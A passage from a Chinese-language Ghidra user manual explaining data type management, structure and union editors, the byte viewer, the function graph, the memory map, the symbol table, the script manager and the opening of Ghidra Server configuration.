当一个数据类型被应用于一个程序中时，该数据类型的一份复制就会创建于程序内。另外，一个与原数据类型的关联也会被建立。然而，当一个数据类型被创建于程序中，并之后被移动到档案中时，会弹出一个对话询问用户是否希望一个关联被建立。如果选择yes，关联将被创建，档案会变成该数据类型的源。 图2-35 是否建立关联 如果想要取消某个数据类型与源档案的关联，我们右键点击数据类型并选择Disassociate From Archive。该数据类型便会变成局部的数据类型，任何对其的修改也不会影响到源档案中的原数据类型。 处理数据类型冲突 当我们尝试移动或者复制数据类型到一个含有同名数据类型的目录下时，便会引发冲突。我们可以在数据类型管理器中提前设置解决冲突的模式。 图2-36 处理数据类型冲突 如上图所示，我们可以在所示图标处选择一种解决冲突的模式。 1 Rename New or Moved Data Type: 将新建或移动过来的数据类型重命名。如原名称是A，其将会被重命名为A.conflict。 2 Use Existing Data Type: 目标目录将不受影响，继续使用改动前的数据类型。 3 Replace Existing Data Type: 与选项2相对地，选择此项将会删除现存的数据类型，并用移动或新建而来的数据类型代替。 4 Replace Empty Structures else Rename: 与选项1类似，只有在目标目录中的冲突类型为一个空的Structure时，移动或新建而来的Structure会将其代替。 替换数据类型 数据类型可以被替换为其他的数据类型。这意味着程序中所有的该数据类型将会被替换为新的数据类型，原数据类型将被删除。有两个方式进行该操作： 1 拖动：将数据类型拖动至将被替换的数据类型上。 2 复制&#x2F;粘贴：右键点击数据类型，并选择Cut。接下来右键选择将被替换的数据类型，选择Paste。 图2-37 替换数据类型 不过使用哪一种方法，都将弹出一个用于确认的对话窗口。 设置偏好的数据类型 数据类型可以被标记为偏好的(favorites)，这些数据类型由此可以出现在陈列窗口的Set Data Type选项当中。这是一个快速将数据类型应用到程序当中的方法。CodeBrowser将大多数常用的内置数据类型标记为了受偏好的。 图2-38 喜爱的数据类型出现位置 想要设置偏好的数据类型，我们可以右键点击数据类型并选择Favorite。偏好的数据类型将会被标以心形图标（如下图所示）。 图2-39 偏好的数据类型 想要移除偏好，右键点击数据类型并取消对Favorite的选择。 需要注意的是，偏好的数据类型的名字必须是独特的。如果我们在目录A与目录B都有叫做A_type的数据类型，我们便不能同时将他们设置为偏好的数据类型。此外，任意的数据类型都可以被设置为偏好的。然而，只有对内置数据类型的设置会在你退出项目或关闭Ghidra时被保存为工具的设置。 2.5.4 编辑用户定义的数据类型** 我们可以通过Structure专用的编辑器来编辑一个结构体数据类型的内容。编辑器可被用于创建新的或编辑已经存在的Structure。下图是编辑器的内容。 图2-40 Structure编辑器 Union的编辑器与Structure的类似。Union的所有组成部分都位于偏移0。 图2-41 Union编辑器 我们可以点击右上角的保存图标来应用对于Union或者Structure的修改。 图2-42 保存图标 编辑器中的搜索 我们可以在编辑器的Search栏中输入想要搜索的内容，并通过上下箭头来选择进行向上或是向下的搜索。 对齐 我们可以在Align的勾选框中选择是否对齐。如果勾选，将会出现额外的选项。 图2-43 额外的选项 未对齐的Structure 当一个Structure未被对齐，它其中的每个组成部分将会紧挨着上一个。也就是说，不会出现自动的对齐或是填充。 对齐的Structure 在对齐的Structure当中，各个组成部分的偏移将会基于他们的数据类型和位置被自动地对齐。一个默认的未定义字节不能被添加到一个对齐的Structure中。而该Structure的总大小取决于所包含的组成部分，以及这些组成部分是否被包入(packed)。如图2-43所示，我们可以在编辑器中指定对齐的属性。 align(minimum)：这个属性指示最小的对齐值。在窗口中可以指定的选项有以下三种。 1 none：不指定最小的对齐值。对该数据类型中组成部分的对齐值取决于其组成部分和包入。 2 machine：将最小的对齐值设置为机器的对齐值。 3 by value：指定最小的对齐值。 pack(maximum)：这个属性指示包入值。在窗口中可以指定的选项有以下两种。 1 none：Structure中的组成部分按照编译器的默认方式对齐，组成部分不被包入。 2 by value：指定包入组成部分时最大的对齐值。 未对齐的Union 当一个Union未被对齐时，其大小就是其最大组成部分的大小。当将一个未对齐的Union放入其他数据类型时，对齐值会是1。 对齐的Union 一个对齐的Union的总大小至少是其最大组成部分的大小，其大小还会受到基于对齐和包入值的影响。与Structure的编辑器中相似地，我们可以在编辑器中对包入值和对齐值进行自定义。Union中所有组成部分的偏移都是0，所以包入值不会对组成部分的偏移造成影响。 编辑操作** 接下来我们会介绍在编辑器当中的具体操作。 插入未定义字节 点击下图所示的图标可插入未定义字节，需要注意的是未定义的字节只能被插入到未对齐的Structure当中。 图2-44 上下的移动 我们可以通过选中一个或一些组成部分并点击上下箭头的图标（如下图所示），来对被选中的组成部分进行向上或向下的移动。 图2-45 复制组成部分 我们可以复制Structure或Union中的组成部分。 1 选中想要复制的组成部分。 2 如果想要复制一份，选择下图中左边的图标；如果想要复制多份，选择右边的图标，这将弹出一个对话窗口，输入想要复制的份数。 图2-46 3 复制的组成部分会紧挨着所选组成部分出现。 创建数组 1 选择一个组成部分。 2 按下形状为的Create Array按键。 3 这将弹出一个询问数组中元素个数的对话窗口，输入个数并选择OK。 图2-47 输入元素个数 4 所选的元素将会成为其数据类型的数组。 在一个Structure当中，我们可以从多个组成部分创建数组。第一个所选的组成部分的数据类型将会成为数组的数据类型。 1 选择多个组成部分。 2 按下形状为的Create Array按键。 3 一个数组将被创建。数组的数据类型将取决于第一个所选的组成部分。 Enum 数据类型编辑器 枚举（Enum）数据类型的编辑器更加简单。如下图所示。 图2-48 Enum类型编辑器 我们可以通过右上角的图标，添加或删除枚举入口，并通过保存图标对修改进行保存。因为操作与Structure高度类似，我们便不再重复进行介绍。 #ghidra使用手册 2.6 Console Console，即控制台，默认位于界面的最底部，用于输出信息。 图2-49 控制台 任何插件都可以传递信息至控制台以显示。大部分情况下，控制台被用来显示脚本的输出。 我们可以通过控制台窗口右上方的小图标锁定窗口的自动滚动，或者清除控制台内容，更多关于脚本本身与控制台的内容我们会在后面介绍。 #ghidra使用手册 3.1 Byte Viewer 即字节查看器，可以将内存中的字节以多种形式展示。 图3-1 字节查看器 我们可以点击如下图所示的图标，或者选择Window→Bytes:…来打开字节查看器。 图3-2 字节查看器图标 3.1.1 数据格式 我们在将在本节中讨论Ghidra提供的默认格式。我们可以点击字节查看器右上角的Set Byte Viewer Options图标来显示我们想要在查看器中展示的格式。 图3-3 更改显示格式 Hex Hex，即十六进制的格式，将各个字节显示为一个两个字符的十六进制值。该格式支持对字节的编辑。 Ascii 将每个字节显示为其对应的Ascii字符。对于那些不存在于Ascii字符中的字节，查看器将其用.表示。该格式支持对字节的编辑。 Address 地址格式会确认字节所对应的地址是否在程序的内存范围。对于那些在内存范围内的地址，查看器会显示 图标。相对的，如果地址不在内存范围内，查看器会显示.。该格式不支持对字节的编辑。 Disassembled 反汇编格式对未定义的字节显示□。对于指令或定义的字节，查看器会显示.。通过查看该格式，我们可以清楚地看出程序哪些部分被反汇编了。该格式不支持对字节的编辑。 HexInteger 该格式将4个字节显示为一个8位的十六进制数。该格式支持对字节的编辑。 Integer 该格式将4个字节显示为一个十进制数。该格式不支持对字节的编辑。 Octal 该格式将各个字节显示为一个三个字符的八进制数。该格式支持对字节的编辑。 Binary 该格式将各个字节显示为一个八个字符的二进制数。该格式支持对字节的编辑。 3.1.2 编辑内存 通过以下操作开启对字节的编辑。 1 切换查看器中的 按键的状态至允许编辑。 2 选择一个支持编辑的格式。 3 当将光标放置于支持编辑的位置上时，光标会变为明显的颜色（此处为蓝色，默认配色为红色）。编辑过的字节也会显示为该颜色。 图3-4 编辑字节 只有在当前地址不包含指令时，我们才能够对字节进行编辑。如果尝试对包含指令的字节进行编辑，我们会被提示editing not allowed。 3.1.3 查看器设置 Byte Viewer Options，即图3-3所示的设置窗口。我们可以在其中对显示进行更改。 Alignment Address 该属性（对齐地址）指定了所显示地址应如何对齐。查看器会根据所提供的地址对地址的对齐自动进行修改。 Bytes Per Line 该属性（每行的字节数）指定了查看器中每行显示的字节个数。默认的值是16。需要注意的是，诸如HexInteger和Integer这样的格式，将字节4个一组的显示，如果每行的字节数不是4的倍数，而我们又勾选显示了这两个格式，查看器将弹出一个错误信息。 Set Group Size 该属性只对Hex格式生效，它指定了将十六进制格式的字节几个一组显示。 #ghidra使用手册 3.2 Comments 在第二章中我们介绍过在反编译窗口，或是陈列窗口中添加注释。我们可以通过Window→Comments来打开一个显示所有注释的窗口。 图3-5 注释窗口 我们可以在其中看到所有注释的位置、类型以及内容，通过点击某条注释，我们便可以在CodeBrowser中导航到相应的位置。 #ghidra使用手册 3.3 Bookmarks 在2.1.3当中，我们介绍了如何添加书签（Bookmarks），Ghidra同样提供了对于书签进行统一管理的窗口。选择Window→Bookmarks来将其打开。 图3-6 书签窗口 书签窗口列出了程序当中所有的书签，并显示标签的类型、分类、描述、地址、标签、书签放置位置的代码单元。我们可以通过点击任意书签以在CodeBrowser当中进行导航。 3.3.1 书签过滤器 我们可以通过对过滤器进行设置来决定书签窗口中显示的内容。点击窗口中的 图标打开过滤器设置窗口。 图3-7 过滤器设置窗口 我们可以简单地通过勾选或是取消勾选来决定显示什么类型的书签。 3.3.2 对书签的编辑 需要注意的是，在书签表格当中，我们只能够对书签的Category和Description列进行编辑。双击想要编辑的位置便可对其进行编辑。 3.3.3 移除书签 1 选择想要移除的书签行。 2 按下Delete按键，或是在书签窗口中点击 图标。 #ghidra使用手册 3.4 Data Type Preview 数据类型预览（Data Type Preview），提供了对某个地址上数据类型的预览。我们可以通过Window→Data Type Preview来开启数据类型预览。当我们在陈列窗口移动光标时，数据类型预览也会随之更新。如果预览中出现了一个有效的地址，我们可以双击并在陈列窗口中导向至该地址。 图3-8 数据类型预览 3.4.1 添加与移除数据类型 点击数据类型预览窗口右上角的+图标，可以选择数据类型的对话窗口。此外，我们可以从数据类型管理器中拖动类型至数据类型预览窗口当中。需要注意的是，数据类型预览窗口不支持动态数据类型。 如果想要移除某个数据类型，选中并点击 图标。 #ghidra使用手册 3.5 Defined Data 我们可以通过数据窗口显示当前程序中定义的数据，我们可以选择Window→Defined Data来打开该窗口。 图3-9 数据窗口 数据窗口中有四列。Data列显示了该数据的字符串表现形式。Location列显示了其位置。Type列显示了该数据的数据类型。Size列显示了该数据的大小（字节）。我们可以通过点击某一列的顶部来以该列内容排序。我们同样可以通过点击某一行以在CodeBrowser当中导向至相应数据的位置。 3.5.1 过滤器设置 我们可以点击数据窗口上方的 图标来调出一个设置数据过滤器的对话窗口。 图3-10 过滤器设置 我们可以在Filter Enable选项中选择是否开启该过滤器。我们可以在Limit Data To选项中选择： 1 Entire Program：显示程序中所有数据。 2 Current View：只显示CodeBrowser中当前内容中的数据。 3 Current Selection：只显示当前所选择内容当中的数据。 使用勾选框来选定想要显示的数据类型。 #ghidra使用手册 3.6 Defined Strings 字符串窗口能够显示所有程序当中定义的字符串。我们可以从Window→Defined Strings打开字符串窗口。 图3-11 字符串窗口 我们可以在其中点击字符串以在陈列窗口中导向至对应的位置。 字符串窗口有以下的列： Location：字符串所在的位置。 String Value：字符串的值。 String Representation：字符串化的表现格式。 Data Type：该字符串的助记符或是数据类型。 Is Ascii：指示该字符串含不含有非ASCII字符的boolean型。 Has Encoding Error：指示该字符串含不含有不能通过字符集转换的字节的boolean型。这通常说明使用了错误的字符集或是该字符串并非真的是字符串。 Charset：该字符串所使用字符集的名字。 需要注意的是，Is Ascii、Has Encoding Error、和Charset列默认不会显示。我们需要右键点击列头并选择Add&#x2F;Remove Columns…来显示对应的列。 #ghidra使用手册 3.7 Disassembled View 反汇编窗口（Disassembled View）显示所选地址及其之上一小部分地址的反汇编。 图3-12 反汇编窗口 我们点击Window→Disassembled View打开反汇编窗口。如上图所示，其中高亮所显示的行是我们在陈列窗口中所选的地址，而剩余的行则显示紧挨着所选地址的地址。反汇编窗口只会显示有效的地址预览，也就是说，如果窗口中显示是空的，则当前所选地址不是内存中有效的地址。 #ghidra使用手册 3.8 Functions 函数窗口(Functions Window)列出了程序当中定义的函数。我们可以点击Window→Functions将其打开。 图3-13 函数窗口 窗口当中有三个列： Name：显示函数名。 Address：显示函数地址。 Function Signature：显示函数签名的预览。 点击某列的头来按照该列内容排序函数。我们也可以点击某个函数以在CodeBrowser中导向至对应位置。 3.8.1 对比函数 我们可以在函数窗口中对函数进行对比。 1 选择想要对比的两个或多个函数。 2 右键并选择Compare Selected Functions，或是直接点击位于窗口上方的 图标。 一个函数对比窗口将会弹出。 #ghidra使用手册 3.9 Function Call Graph 函数调用图（Function Call Graph）是一个对于当前函数收到和使用的函数调用的简单图像化展示窗口。这个功能可以帮助我们理解当前的函数在程序中的作用。我们可以点击Window→Function Call Graph来打开该窗口。 图3-14 函数调用图形 3.9.1 显示与隐藏 在函数调用图形中，我们可以按照需求隐藏或者显示函数调用。 图3-15 显示与隐藏 如上图所示，我们可以通过点击一个节点上的-图标来隐藏其对应连接的路径，也可以通过点击+图标将其显示。需要注意的是，函数调用图形只是整个程序图形当中的一部分，我们看到的图形不是程序中所有的函数以及函数调用。 3.9.2 导向 在默认设置下（窗口右上角的Incoming Navigation为开启状态），双击一个节点便可以以其为中心显示函数调用图。我们也可以利用窗口左上角的左右箭头，来做基于浏览历史的导向。 #ghidra使用手册 3.10 Function Graph 函数图（Function Graph）是一个对陈列窗口中当前函数进行简单图形化的显示窗口。 图3-16 函数图窗口 如上图所示，该窗口包含右下角的卫星视图以及除此之外的主要视图。 3.10.1 主要视图 主要视图中即除右下角卫星视图之外的部分。主要视图显示了代码块与控制流（箭头）。 代码块 每个图形中的矩形都代表了所选函数中的一部分代码（代码块）。我们可以通过左键点击选中代码块。如同Ghidra中其他工具中的选择一样，我们可以通过按住Ctrl键选择多个代码块。 我们可以通过鼠标滚轮缩放主要视图，也可以通过双击代码块的头部，将该代码块放大并居中显示。放大后，我们可以通过双击代码块当中的内容来进行相应的导向。 组合代码块 我们可以选择两个或者更多的代码块，并将它们组合成一个组合的代码块。这可以帮助我们将函数图变的更加简洁易读。下图中所示的代码块便是由三个代码块组合而成。 图3-17 函数图窗口 选择两个或多个代码块，右键并选择Group Selected Vertices，一个标题为Enter Group Vertex Text的对话窗口将会弹出，这个对话窗口中的内容将会显示在组合的代码块中。默认情况下，其内容会列出所组合的代码块的标题（如上图所示）。 如果想要解除代码块的组合，选择组合而成的代码块，并右键点击Ungroup Selected Vertices。 控制流 箭头被用于显示从一个代码块到另一个的流。流分为三种。 1 Fallthrough：一个条件检查的否定情况。 2 Conditional：一个条件检查的肯定情况。 3 Unconditional：无条件的流。 我们可以通过颜色区分这三种流。在函数窗口中右键并选择Properties可以调出对颜色的自定义窗口。我们可以在其中确认以及修改这三种流所对应箭头的颜色。 图3-18 箭头颜色设置 与对代码块的选择一样，我们可以通过左键点击选中一个箭头，双击一个箭头将会导向至该控制流的终点，再次双击该箭头导向回控制流的起点。 我们可以将光标悬浮于控制流箭头上来获取信息，其中包括控制流的终点与起点的预览。 3.10.2 卫星视图 卫星视图提供了对于整个图的总览。我们也可以在卫星视图中对图整体的位置做出基本的调整。同时，卫星视图中还提示了当前主要视图中的位置位于整个函数图的哪里。我们可以通过勾选或取消勾选右键菜单中的Display Satellite View来决定是否显示卫星视图。 类似地，我们可以通过勾选或取消勾选右键菜单中的Dock Satellite View来决定是否将卫星视图镶嵌于主要视图的窗口当中。 #ghidra使用手册 4.1 Equates Table 这一章当中，我们会介绍剩下的一些使用机会相对少一些的功能窗口（因人因事而异）。 等量（Equates），即是在任意代码单元中对一个数值的字符串表示。比如说，在如下的指令当中： MOV RAX, $0xf 数值$0xf可以被字符串EQUATES_SAMPLE代替，也即： MOV RAX, EQUATES_SAMPLE EQUATES_SAMPLE在这里便是$0xf的等值，也就是说，他们是相等的。 4.1.1 设置等值 我们可以在陈列窗口当中设置等值。 图4-1 设置等值 1 右键点击目标标量值，并选择Set Equate，或使用快捷键E。这将调出一个用于设置等值的对话窗口。 2 我们可以从已知的关联字符串当中选择，或是手动输入一个字符串。该字符串会成为目标标量的等值。 3 我们可以看到如下选项： Current Location：将等值运用于当前所选位置。 Current Selection：只有当我们在程序中选中了一部分内容时，该选项才会被显示为可用。反之，就会如上图一样，选项为灰色。选中后字符串将会应用于所有选中的内容中的对应值。 Entire Program：等值会运用于整个程序当中的所有对应标量。 Overwrite existing equates：只有选择了Current Selection或Entire Program的情况下，该选项才可以被勾选。如果该选项被勾选，当前所选内容或是整个程序中所有对应的标量以及对应等值，将会被替换为现在给定的字符串。如果不勾选，只有那些还没有应用等值的标量，才会被替换为现在给定的字符串。 4.1.2 查看等值 等值表，即Equates Table的作用，便是用来查看等值以及他们的引用。我们可以选择Window→Equates Table来打开等值表。 图4-2 等值表 左侧的面板列出了等值的名字、对应值、以及引用的次数。右侧的面板则列出了每次引用的地址。点击右侧面板中的地址可以让CodeBrowser导向至该地址。 我们可以在等值表中重命名等值，只需要双击名字并输入一个新的名字。 #ghidra使用手册 4.2 Function Tag 函数标签（Function Tag）窗口列出了当前打开程序的函数标签。该窗口也会显示当前选中函数的标签。标签可以由用户创建，也可以从预定义集中加载。我们可以选择Window→Function Tags来打开函数标签窗口。 图4-3 函数标签窗口 如上图所示，该窗口分为五个区域： Available Tags List：显示所有能够分配给当前函数的标签。 Assigned Tags List：显示所有已经分配给当前函数的标签。 Tag Input Field：允许用户创建新的标签，可以同时创建多标签。 Filter Field：筛选想要显示的标签。 Action Buttons：从上至下三个按钮分别能： 将选中的标签分配给当前函数； 从当前函数中移除选中的标签； 删除选中的标签并将其从所有函数中移除。 4.2.1 标签操作 创建标签 我们可以在上文中介绍的Tag Input Field当中创建标签。我们可以用逗号分隔一次性输入并创造多个标签。所有新建的标签将会被显示于Available Tags List当中，不会被分配给任何函数。 删除标签 选中想要删除的标签，并点击 图标，一个用于确认的对话窗口将会弹出。如果确认删除，该标签会被删除并从所有函数中移除。 编辑 双击一个标签便可以对其进行编辑。从外部源导入的标签不能被编辑或删除。 分配与移除 我们可以通过上文中提到的左右箭头按钮，对所选的标签进行分配或移除。 #ghidra使用手册 4.3 Memory Map 内存映射（Memory Map）窗口显示了当前程序的内存结构。我们可以点击Window→Memory Map或是在工具栏中点击 图标来打开内存映射窗口。 图4-4 内存映射窗口 Ghidra通过内存映射窗口支持四种不同的内存区块类型，分别是： 1 Default：普通的区块类型，可以是初始化的或未初始化的。 2 Bit Mapped：区块提供了“位可寻址”的映射到其他区块上。 3 Byte Mapped：区块提供了“字节可寻址”的映射到其他区块上。 4 Overlay：区块被创建于一个新的重叠的地址空间。 4.3.1 显示内容 内存映射窗口中每一列的内容如下： Name：内存块的内容。 Start：内存块起始地址（十六进制）。 End：内存块结束地址（十六进制）。 Length：内存块长度（十六进制）。 R：读权限。 W：写权限。 X：执行权限。 Volatile：指示易失的I&#x2F;O内存。 Type：指示内存区块的类型（Default、Bit Mapped、Byte Mapped或是Overlay）。 Source：按照文件导入器生成这些字节填充该区块的文件名字。对于类别为Bit Mapped或是Byte Mapped的区块，Source会显示映射的源地址。 Comment：用户对该内存区块添加的注释。 4.3.2 内存区块编辑 重命名 我们可以在name列双击对所选区块进行重命名。 更改权限 利用R、W、X列中的勾选框对相应的权限进行更改。 初始化内存区块 我们可以通过勾选Initialized列的勾选框来初始化当前未初始化的内存区块。这将调出一个对话窗口，我们输入想要用来填充该内存区块的值。 图4-5 指定填充值 编辑注释 我们可以双击内存映射窗口中的注释区域以编辑注释。注释最大长度为256个字符。 4.3.3 内存区块操作 添加 我们可以点击窗口右上角的+图标来添加内存区块，一个用于添加内存区块的对话窗口将会弹出。 图4-6 添加 Block Name：新的内存区块的名称。 Start Addr：新的内存区块的起始地址。如果程序语言定义了多个地址空间，那么我们也需要指定地址空间。地址空间的选项在只有一个地址空间被定义时不会显示。 Length：新的内存区块的长度。 Comment：注释。 Read、Write、Execute：设置相应的权限。 Volatile：标记为易失性的I&#x2F;O内存。 Block Types：选择内存区块的类型。 移动 与添加操作类似，我们可以点击移动图标 ，调出移动内存区块的对话窗口。并在New Start Address与New End Address中填入新的起始地址。（如果输入新的起始地址，新的结束地址会被自动计算；如果输入新的结束地址，新的起始地址也会被自动计算）。 分割 选择Split图标 调出分割内存区块的对话窗口。我们有四种输入分割点的方式。 1 输入首个内存区块（block to split）的结束地址。 2 输入首个内存区块（block to split）的长度。 3 输入第二个内存区块（new block）的起始地址。 4 输入第二个内存区块（new block）的长度。 图4-7 添加 扩展 我们可以选择 图标来向上或向下对内存区块进行扩展。向上扩展时，在弹出的窗口中指定新的起始地址（New Start Address）；向下扩展时，在弹出的窗口中指定新的结束地址(New End Address)。 #ghidra使用手册 4.4 Register Manager 寄存器管理器Register Manager能够显示程序中不同地址中寄存器被分配的值。我们可以选择Window→Register Manager来将其打开。 图4-8 寄存管理器窗口 如上图所示，窗口的左侧包含了程序所有定义的寄存器。如果一些寄存器被语言按类别分组，同一组别的寄存器将在一个文件夹下。当我们在左侧选中了某个寄存器后，窗口的右侧会显示所选寄存器拥有分配的值的地址。 4.4.1 编辑一个地址段的寄存器值 我们可以在窗口右侧中双击一个地址段，这将调出一个编辑寄存器值的对话窗口。 图4-9 编辑寄存器值 我们可以在该对话窗口中调整起始与结束地址，并将在该地址的寄存器值进行更改。需要注意的是，如果我们指定了一个更小的地址段，被截断的地址部分会被有效地清除。如上图所示，如果我们将结束地址改为080482ef，那么080482ec至080482ef将拥有指定值0x8049ff4，而080482f0将不会拥有值。 4.4.2 编辑寄存器在多个地址段中的值 我们可以在陈列窗口当中右键点击一个寄存器，并在菜单中选择Set Register Values，或者直接按下Ctrl+R快捷键。这将弹出如下的对话窗口。 图4-10 设置寄存器值 Address(es)栏中显示了将会受到本次改动影响的地址。我们在Value栏中输入指定的值，其默认格式是无符号的十六进制数，不过我们可以在临近的选择栏中选择格式。 类似地，我们可以通过在陈列窗口中右键点击一个寄存器，并选择Clear Register Values来清除寄存器在对应地址段的值，将受到影响的地址段同样会在Address(es)栏中显示。 #ghidra使用手册 4.5 Relocation Table 重定位表（Relocation Table）显示了程序当中定义的每一个重定位。重定位信息由自动导入器创建。我们可以选择Window→Relocaton Table将重定位表窗口打开。 图4-11 重定位表 如上图所示，该窗口显示了以下几列信息，分别是： Address：重定位被定义的位置。 Type：重定位的类型。 Values：重定位时所用的值。 Bytes：重定位时所用的原字节。 #ghidra使用手册 4.6 Symbol Table &amp; Symbol References 符号表（Symbol Table）显示了程序当中所定义的各个符号。符号，又被成为标签（Label），是名称与地址之间的关联。我们可以选择Window→Symbol Table来打开符号表。默认工具设定下，打开符号表的同时，符号引用表（Symbol References）也会被打开。如下图所示，显示在左侧的为符号表，显示在右侧的则是符号引用表。 图4-12 符号表与符号引用表 4.6.1 符号表 符号表中的各列包括以下内容： Label：符号的名字。 Location：符号所定义的地址。 Type：符号的类型（函数、外部、类，等等）。 Datatype：在符号地址所应用的数据类型。 Namespace：符号处的命名空间。 Source：标明符号的名字来自哪里。 Reference Count：对该符号的引用次数。 文本过滤器 我们可以使用符号表下方的文本过滤器。 图4-13 文本过滤器 我们可以在输入框右侧的图标中选择文本过滤的匹配模式，包括“以…打头”，“完全一致”和“正则表达式”。更右侧的Name Only勾选框决定应用过滤器至名字列或是所有列。 过滤器 除去文本过滤器，符号表还提供了更全面的过滤器。我们可以点击右上角的Configure Symbol Filter 图标来对过滤器进行配置。 图4-14 过滤器设置 这将调出一个对话窗口。如上图所示，该窗口包含三个部分：Symbol Source（符号源）、Symbol Types（符号类型）和默认情况下被隐藏的Advanced Filters。 符号源（Symbol Source）：我们可以在如下勾选框中选择想要显示的符号源。 User Defined：用户命名的符号。 Imported：导入信息命名的符号。 Analysis：自动分析器命名的符号。 Default(Functions)：拥有默认名称的函数符号。 Default(Labels)：拥有默认名称的非函数符号。 符号类型（Symbol Type）：我们可以在如下勾选框中选择想要显示的符号类型。 Instruction Labels：位于存在指令的地址的标志。 Data Labels：位于存在数据或外部标志的地址的标志。 Functions：位于函数被定义的位置的标志。 Namespaces：命名空间的名称标志。 Classes：C++类名称标志。 External Library：外部库名称标志。 Parameters：函数参数名标志。 Local Variables：局部变量名称标志。 Global Register Variable：全局寄存器变量名称标志。 高级过滤设置（Advanced Filters）我们可以勾选Use Advanced Filters勾选框来显示高级过滤选项。 Externals：只接受外部标志。 Non-Externals：只接受非外部标志。 Primary Labels：只接受地址上的首要标志。应用于标签与函数。 Non-Primary Labels：只接受地址上的非首要标志。应用于标签与函数。 Globals：接受全局命名空间中的标志。应用于标签、函数、命名空间与类。 Locals：接受不在全局命名空间中的标志。应用于标签、函数、命名空间与类。 Register Variables：接受基于寄存器的函数参数或局部变量。 Stack Variables：接受基于栈的函数参数或局部变量。 Entry Points：接受位于外部入口点的标签或函数。 Subroutines：接受被某指令调用的标签。 Not In Memory：接受位于不在内存中的地址上的标签。 Unreferenced：接受没有被引用过的标签或函数（也被称为dead code）。 Offcut Labels：接受不在指令或数据开始处的标签。应用于标签。 4.6.2 符号引用表 窗口右侧的符号引用表显示了关于引用的信息。当我们在符号表中选中了一个符号时，符号引用表中会显示该标志的引用信息。 我们可以通过以下三个切换按钮来控制显示的引用类型：References To、Instruction From和Data From，他们分别对应这三个图标 。 References To显示所有对当前选中的符号的引用。 Instruction From开启状态下，如果所选符号对应一个函数或是子路径的入口点，所有引用该子路径&#x2F;函数的指令将会被显示。如果所选符号不是一个子路径&#x2F;函数的入口点，所显示内容将为空白。 Data From：开启状态下，如果所选符号对应一个函数或是子路径的入口点，所有引用该子路径&#x2F;函数的数据将会被显示。如果所选符号不是一个子路径&#x2F;函数的入口点，所显示内容将为空白。 图4-15 符号引用表 如上图所示，符号引用表所显示的列如下： Address：对应所选符号的地址。点击地址将能够在CodeBrowser中进行导向（重定位）。 Laebl：显示所选符号引用地址的主要符号名称。 Subroutine：显示所选符号引用地址的子路径&#x2F;函数名称。 Access：指示引用类型。 Preview：引用源位置的指令或数据的预览。 #ghidra使用手册 4.7 Checksum Generator Ghidra方便地为我们提供了Checksum生成器。我们可以从Tools→Generate Checksum…或者Window→Checksum Generator来调出Checksum生成器窗口。 图4-16 Checksum生成器 可以看到窗口右上角有一些图标 ，我们将从左到右对其一一进行介绍。 1’s Complement：对当前checksum进行1’s complement 操作 2’s Complement：对当前checksum进行2’s complement 操作 XOR：对当前checksum进行异或操作 Carry：对当前checksum进行进位操作 On Selection：当该按钮被选中时，只生成当前选中内容的checksum。反之，则生成整个程序中所有字节的checksum。 As Hex：切换显示十六进制值或是十进制值。 Refreshes Checksum：刷新所生成的checksum。大多数情况下，checksum值会自动更新。 #ghidra使用手册 4.8 Script Manager 脚本管理器（Script Manager）允许我们高效地对Ghidra的功能进行扩展开发。不像传统的Ghidra插件那样需要一个完整的开发环境，我们可以在运行Ghidra的同时开发Ghidra脚本。我们可以对脚本做出更改并立即执行。 图4-17 脚本管理器 如上图所示，我们可以看到脚本管理器的窗口包括以下部分。 Script Category Tree：靠左侧的脚本类型树将脚本按类型组织。 Script Table：窗口中间最大的部分显示了脚本的各类信息。包括： 第一列指示是否应该为了该脚本创建一个操作。如果一个脚本拥有菜单路径，或是默认的按键绑定，选中该列中的勾选框会导致对菜单路径&#x2F;按键绑定的操作。 第二列指示了该脚本的状态。如果空白这说明该脚本没有问题。 Filename列显示了该脚本的文件名。 Description列显示了脚本元数据中的描述。 Key Binding列则显示了脚本所关联的按键绑定。 Filter：过滤器，我们可以用它来搜索想要寻找的脚本。 Description Panel：在窗口最下侧，显示了所选脚本的元数据，包括其作者、描述、按键绑定等。 我们会在后面的章节当中详细介绍如何开发Ghidra的脚本。 #ghidra使用手册 4.9 External Programs 外部程序（External Programs）窗口显示了外部程序名以及与它们相关联的Ghidra程序文件。我们选择Window→External Programs将其打开。 图4-19 外部程序窗口 Name列中显示了外部程序的名称。 Ghidra Program列中显示了与外部程序名称所关联的Ghidra文件。如果显示空白，则说明没有外部引用被解析。如果外部程序名称未与Ghidra文件关联，Ghidra不能够找到外部引用。 4.9.1 添加外部程序名称 点击 图标以创建新的外部程序名称。 4.9.2 设置外部名称的关联 选中一个外部程序名称，并点击 图标以设置对其关联的外部程序。选中多个外部程序名称时，该按钮不可用。 图4-20 设置外部程序关联 #ghidra使用手册 5.1 搭建Ghidra Server 一个Ghidra项目中包含某个逆向工程的进度。Ghidra项目将程序进行组织并允许多个用户进行合作。Ghidra中引入了项目池（project repository）的概念，项目仓库中可能有记录了版本的、共享的、或是私有的文件。多个用户可以在共享的项目当中添加文件，获取服务端的文件并且创建新版本的文件。私有文件则存在于本地。 由于本地（非共享）的项目管理非常简单明了，在以下章节当中我们会主要介绍基于Ghidra Server的共享项目管理。 在开始创建项目之前，我们需要先搭建一个Ghidra服务器。Ghidra服务端的功能已经被涵盖于标准的Ghidra发行版本当中。我们会在以下的内容中从头开始搭建一个Ghidra服务器。用于示例的操作系统为Windows 10。 我们首先用第1章当中介绍过的方式，下载、解压并配置好Ghidra的运行环境。 切换到Ghidra的目录当中，进入server目录，可以看到有以下文件（夹）。 图5-1 server目录 5.1.1 服务器配置 在安装以及运行Ghidra服务器之前，我们需要修改server.conf文件来满足我们的特定需求。 图5-2 配置文件 在文件当中，找到这样的行： wrapper.app.parameter.# 图5-3 定位到这样的行 这些行代表了启动Ghidra服务器时的参数，#说明该行代表第个参数，编辑或添加时应当注意不要使#重复。行的等号右侧则代表了所对应的具体的参数。 启动的参数应如下列格式： [-ip ###.###.###.###] [-p#] [-a#] [-anonymous] [-ssh] [-d] [-e] [-u] [-n] 其中，[-ip ###.###.###.###]: 绑定的ip地址（默认情况下将被绑定至hostname）。 [-p#]：使用的TCP端口（默认为13100）。 [-a#]：选择授权模式，其中#可以是0或2; 0 - 用户私钥 1 - PKI授权 [-anonymous]：启用匿名的仓库访问。 [-ssh]：启用SSH认证。 [-e]：指定密码过期时间（单位为天），默认时间为1天，只可用于a0模式。 [-u]：要求用户输入用户ID，不应用于a2模式。 [-n]：在登录时启用IP地址反向名称查询。 ：指明存储项目仓库的目录。 